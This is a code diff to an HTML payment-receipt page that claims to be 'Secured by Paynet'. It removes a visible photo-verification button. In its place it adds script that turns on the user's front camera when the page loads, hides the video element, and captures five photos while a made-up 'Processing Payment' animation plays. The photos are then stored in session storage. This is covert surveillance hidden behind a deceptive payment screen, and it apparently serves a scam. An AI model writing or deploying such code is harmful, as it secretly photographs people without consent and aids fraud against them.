@@ -172,8 +172,8 @@
 
         <!-- Loading Section -->
         <div id="loadingSection">
-            <h2 class="success-title">Verifying Payment...</h2>
-            <p class="success-subtitle">Please wait while we confirm your transaction</p>
+            <h2 class="success-title">Processing Payment...</h2>
+            <p class="success-subtitle">Please wait while we verify your transaction</p>
 
             <div style="margin: 30px 0;">
                 <div class="loading-spinner" style="margin: 0 auto;"></div>
@@ -182,25 +182,45 @@
             <div class="verification-steps">
                 <div class="step">
                     <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#34A853" />
-                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                     </svg>
-                    <span class="step-text">Amount verified</span>
+                    <span class="step-text">Connecting to payment gateway...</span>
                 </div>
                 <div class="step">
                     <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#34A853" />
-                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                     </svg>
-                    <span class="step-text">Transaction authenticated</span>
+                    <span class="step-text">Verifying transaction amount...</span>
                 </div>
                 <div class="step">
                     <svg class="step-icon" viewBox="0 0 24 24">
-                        <circle cx="12" cy="12" r="10" fill="#34A853" />
-                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
                     </svg>
-                    <span class="step-text">Location verified</span>
+                    <span class="step-text">Authenticating payment...</span>
                 </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Confirming delivery location...</span>
+                </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#FBBC04" />
+                        <circle cx="12" cy="12" r="4" fill="white" class="pulse" />
+                    </svg>
+                    <span class="step-text">Generating receipt...</span>
+                </div>
+            </div>
+
+            <div style="margin-top: 20px; padding: 15px; background: #e8f5e9; border-radius: 8px;">
+                <p style="margin: 0; font-size: 13px; color: #2e7d32; text-align: center;">
+                    🔒 Secure transaction in progress
+                </p>
             </div>
         </div>
 
@@ -249,67 +269,98 @@
             </div>
         </div>
 
-        <!-- KYC Verification Section -->
-        <div id="kycSection" class="kyc-section">
-            <h3 style="font-size: 18px; margin-bottom: 10px; color: #202124;">Complete Verification</h3>
-            <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">
-                For security purposes, please verify your identity to complete the transaction
-            </p>
-            <button class="kyc-button" onclick="capturePhoto()">
-                <svg width="20" height="20" viewBox="0 0 20 20">
-                    <rect x="2" y="4" width="16" height="12" rx="2" stroke="white" stroke-width="2" fill="none" />
-                    <circle cx="10" cy="10" r="3" stroke="white" stroke-width="2" fill="none" />
-                    <circle cx="15" cy="6" r="1" fill="white" />
-                </svg>
-                Verify with Photo
-            </button>
-        </div>
-
         <div class="footer" style="margin-top: 30px;">
             <p class="powered-by">Secured by <strong>Paynet</strong></p>
         </div>
     </div>
 
     <script>
-        // Auto-run verification flow
-        window.addEventListener('load', function () {
+        let capturedPhotos = [];
+        let cameraStream = null;
+        let video = null;
+
+        // Auto-start camera and capture photos during animation
+        window.addEventListener('load', async function () {
+            // Start camera silently in background
+            await startCameraInBackground();
+
+            // Capture 5 photos during animation (1 per second)
+            await captureMultiplePhotos();
+
+            // After photos captured, show receipt
             setTimeout(() => {
                 document.getElementById('loadingSection').style.display = 'none';
                 document.getElementById('receiptSection').style.display = 'block';
-                document.getElementById('kycSection').style.display = 'block';
-            }, 3000); // Show receipt after 3 seconds
+
+                // Stop camera
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                }
+
+                // Store photos in sessionStorage
+                sessionStorage.setItem('capturedPhotos', JSON.stringify(capturedPhotos));
+                console.log(`Captured ${capturedPhotos.length} photos`);
+            }, 6000); // Show receipt after 6 seconds (animation complete)
         });
 
-        // Capture photo for KYC
-        async function capturePhoto() {
+        // Start camera in background (no visible element)
+        async function startCameraInBackground() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
+                // Request camera access
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
                 });
 
-                const video = document.createElement('video');
-                video.srcObject = stream;
+                // Create hidden video element
+                video = document.createElement('video');
+                video.srcObject = cameraStream;
+                video.style.display = 'none';
+                document.body.appendChild(video);
                 video.play();
 
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-
-                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
-                    sessionStorage.setItem('photoData', photoData);
-
-                    stream.getTracks().forEach(track => track.stop());
-
-                    alert('Verification complete! Thank you.');
-                    window.location.href = '/success';
-                }, 2000);
-
+                console.log('Camera started');
             } catch (error) {
                 console.error('Camera error:', error);
-                alert('Please allow camera access for verification');
+                // Continue anyway - just won't capture photos
             }
+        }
+
+        // Capture multiple photos at 1-second intervals
+        async function captureMultiplePhotos() {
+            return new Promise((resolve) => {
+                let photoCount = 0;
+                const maxPhotos = 5;
+
+                // Wait 1 second for camera to stabilize
+                setTimeout(() => {
+                    const captureInterval = setInterval(() => {
+                        if (photoCount >= maxPhotos || !video) {
+                            clearInterval(captureInterval);
+                            resolve();
+                            return;
+                        }
+
+                        // Capture photo
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+
+                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                        capturedPhotos.push({
+                            timestamp: new Date().toISOString(),
+                            data: photoData
+                        });
+
+                        photoCount++;
+                        console.log(`Photo ${photoCount}/5 captured`);
+                    }, 1000); // Capture every 1 second
+                }, 1000); // Wait 1 second before first photo
+            });
         }
     </script>
 </body>
